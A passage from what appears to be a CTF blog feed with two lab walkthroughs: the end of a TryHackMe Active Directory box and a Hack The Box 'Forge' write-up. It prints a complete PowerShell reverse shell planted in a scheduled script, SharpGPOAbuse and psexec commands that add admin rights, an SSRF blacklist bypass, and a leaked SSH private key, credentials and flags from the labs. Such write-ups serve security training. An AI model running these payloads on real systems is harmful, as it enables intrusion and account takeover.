  ..                                  D        0  Tue Feb 23 17:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021

                9558271 blocks of size 4096. 5130697 blocks available
smb: \&gt; get PurgeIrrelevantData_1826.ps1 
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \&gt; ^C

% cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue

% vi PurgeIrrelevantData_1826.ps1 

% cat PurgeIrrelevantData_1826.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.18.25.218",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</span></code></pre></figure>

<p>And now we wait for reverse to come back.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% smbclient <span class="se">\\\\</span>vulnnet.local<span class="se">\\</span>Enterprise-Share <span class="nt">-U</span> enterprise-security
Enter WORKGROUP<span class="se">\e</span>nterprise-security<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \&gt; put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \&gt; put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \&gt; ^C

% rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.18.25.218] from (UNKNOWN) [10.10.248.175] 50033
whoami
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads&gt; </span></code></pre></figure>

<h1 id="gpo">GPO</h1>

<p>Since this is AD, we run bloodhound to check permissions and we find out that we have generic write permission to one of GPO. Let’s use SharpGPOAbuse.exe to update our user to Administrator.</p>

<figure>
<img src="/assets/img/active/blood.png" alt="Bloddhound" />
<figcaption> Bloodhound </figcaption>
</figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-security<span class="se">\D</span>ownloads&gt;.<span class="se">\S</span>harpGPOAbuse.exe <span class="nt">--AddComputerTask</span> <span class="nt">--TaskName</span> <span class="s2">"PissOFF"</span> <span class="nt">--Author</span> vulnnet<span class="se">\a</span>dministrator <span class="nt">--Command</span> <span class="s2">"cmd.exe"</span> <span class="nt">--Arguments</span> <span class="s2">"/c net localgroup administrators enterprise-security /add"</span> <span class="nt">--GPOName</span> <span class="s2">"SECURITY-POL-VN"</span> <span class="nt">--Force</span>
<span class="o">[</span>+] Domain <span class="o">=</span> vulnnet.local
<span class="o">[</span>+] Domain Controller <span class="o">=</span> VULNNET-BC3TCK1SHNQ.vulnnet.local
<span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>vulnnet,DC<span class="o">=</span><span class="nb">local</span>
<span class="o">[</span>+] GUID of <span class="s2">"SECURITY-POL-VN"</span> is: <span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
<span class="o">[</span>+] Creating file <span class="se">\\</span>vulnnet.local<span class="se">\S</span>ysVol<span class="se">\v</span>ulnnet.local<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\S</span>cheduledTasks<span class="se">\S</span>cheduledTasks.xml
<span class="o">[</span>+] versionNumber attribute changed successfully
<span class="o">[</span>+] The version number <span class="k">in </span>GPT.ini was increased successfully.
<span class="o">[</span>+] The GPO was modified to include a new immediate task. Wait <span class="k">for </span>the GPO refresh cycle.
<span class="o">[</span>+] Done!</code></pre></figure>

<p>And, now we can login as Administrator with the same creds.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">psexec.py enterprise-security:sand_0873959498@10.10.193.68
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.193.68.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file lhSSLqub.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.193.68.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Dxat on 10.10.193.68.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Dxat.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1757]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
The system cannot find the file specified.

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

02/23/2021  08:27 PM    &lt;DIR&gt;          <span class="nb">.</span>
02/23/2021  08:27 PM    &lt;DIR&gt;          ..
02/23/2021  08:27 PM                37 system.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             37 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  21,137,522,688 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>system.txt
THM<span class="o">{</span>d540c0645975900e5bb9167aa431fc9b<span class="o">}</span>
C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; </code></pre></figure>]]></content><author><name>zexionx00</name><email>zexionx00@gmail.com</email></author><category term="THM" /><summary type="html"><![CDATA[Medium rated machine from Try Hack Me]]></summary></entry><entry><title type="html">Forge - Hack The Box</title><link href="http://localhost:4000/Forge/" rel="alternate" type="text/html" title="Forge - Hack The Box" /><published>2021-09-12T01:00:07+01:00</published><updated>2021-09-12T01:00:07+01:00</updated><id>http://localhost:4000/Forge</id><content type="html" xml:base="http://localhost:4000/Forge/"><![CDATA[<figure>
<img src="/assets/img/forge/forge.png" alt="forge" />
<figcaption> Forge - Hack The Box </figcaption>
</figure>

<h1 id="introduction">Introduction</h1>

<p><a href="https://www.hackthebox.com/home/machines/profile/376" target="_blank" rel="noopener nofollow">Forge</a> is medium rated machine from Hack The Box, which includes SSRF to get ftp credentials from internal server, for root we use pdb abuse to get a root shell.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.91 scan initiated Sun Jan 30 01:12:21 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.11.111</span>
Nmap scan report <span class="k">for </span>10.10.11.111
Host is up, received echo-reply ttl 63 <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-30 01:12:22 EST <span class="k">for </span>33s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE    SERVICE REASON         VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0<span class="o">=</span>
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y<span class="o">=</span>
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Jan 30 01:12:55 2022 -- 1 IP address (1 host up) scanned in 34.18 seconds</span></code></pre></figure>

<h1 id="subdomain">SubDomain</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://forge.htb <span class="nt">-H</span> <span class="s1">'Host: FUZZ.forge.htb'</span> <span class="nt">--fl</span> 10

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response lines: 10
________________________________________________

ADMIN                   [Status: 200, Size: 27, Words: 4, Lines: 2]
admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
Admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
:: Progress: [4614/4614] :: Job [1/1] :: 116 req/sec :: Duration: [0:00:44] :: Errors: 0 ::</span></code></pre></figure>

<h1 id="web">Web</h1>

<p>We get /upload page where we can upload local file and upload from url. When trying to upload php cmdshell or php reverse shell, we don’t get any hit. So, when trying to upload from url and give our IP, we indeed get a hit.</p>

<figure>
<img src="/assets/img/forge/up.png" alt="upload" />
<figcaption> Upload </figcaption>
</figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 80
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>10.10.14.54] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.111] 38900
GET / HTTP/1.1
Host: 10.10.14.54
User-Agent: python-requests/2.25.1
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept: <span class="k">*</span>/<span class="k">*</span>
Connection: keep-alive</code></pre></figure>

<h1 id="adminforgehtb">Admin.forge.htb</h1>

<p>We got a new subdomain admin.forge.htb, but we get only localhost allowed. But we have SSRF, upload from url but now we get blacklisted address.</p>

<figure>
<img src="/assets/img/forge/black.png" alt="Black" />
<figcaption> BlackListed </figcaption>
</figure>

<h1 id="bypass">Bypass</h1>

<p>So, what we can do to bypass is just give the url with all CAPS, and we indeed get page back.</p>

<figure>
<img src="/assets/img/forge/cap.png" alt="Bypass" />
<figcaption> Capital Bypass </figcaption>
</figure>

<figure class="highlight"><pre><code class="language-html" data-lang="html">% curl http://forge.htb/uploads/8RUPPDxDkIhklsiZXCAd
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Admin Portal<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;center&gt;&lt;h1&gt;</span>Welcome Admins!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>There is a page called /announcements, so let’s try to visit there.</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html">% curl http://forge.htb/uploads/aIUpLGjET5IfWYH4yTYt
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Announcements<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/announcements.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li&gt;</span>An internal ftp server has been setup with credentials as user:heightofsecurity123!<span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;li&gt;</span>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.<span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;li&gt;</span>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<span class="ni">&amp;lt;</span>url<span class="ni">&amp;gt;</span>.<span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>We get credential there and also it says how to access it. So, let’s do it.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% curl http://forge.htb/uploads/c8bsS3FN7jn4TmgjJIXR
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
<span class="nt">-rw-r-----</span>    1 0        1000           33 Jan 29 06:07 user.txt</code></pre></figure>

<p>This looks like a directory listing of user’s directory. So, let’s grab the id_rsa of user.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% curl http://forge.htb/uploads/0XyXpVJum9WSu3tm1WEk
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class="o">=</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----</code></pre></figure>

<p>And we can get in the system as user. If you are confused how I got the username, just get /etc/passwd. You’ll get in there.</p>

<h1 id="ssh">SSH</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% ssh <span class="nt">-i</span> id_rsa user@forge.htb 
The authenticity of host <span class="s1">'forge.htb (10.10.11.111)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:e/qp97tB7zm4r/sMgxwxPixH0d4YFnuB6uKn1GP5GTw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>forge.htb,10.10.11.111<span class="s1">' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 30 Jan 2022 06:44:24 AM UTC

  System load:  0.0               Processes:             223
  Usage of /:   44.4% of 6.82GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan 30 06:20:04 2022 from 10.10.16.3
user@forge:~$ ls
snap  user.txt
user@forge:~$ cat user.txt 
d47acefe482af3ea8f484f728110f5b3
user@forge:~$ </span></code></pre></figure>

<h1 id="root">Root</h1>

<p>The basic sudo -l reveals /opt/remote-manage.py can run as root without password. Checking the python script, we see that if there is Exception, the pdb is set. So, let’s break the script while running, and get into pdb session.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">pdb</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter the secret passsword: '</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'secretadminpassword'</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Wrong password!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome admin!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">What do you wanna do: </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[1] View processes</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[2] View free memory</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[3] View listening sockets</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[4] Quit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
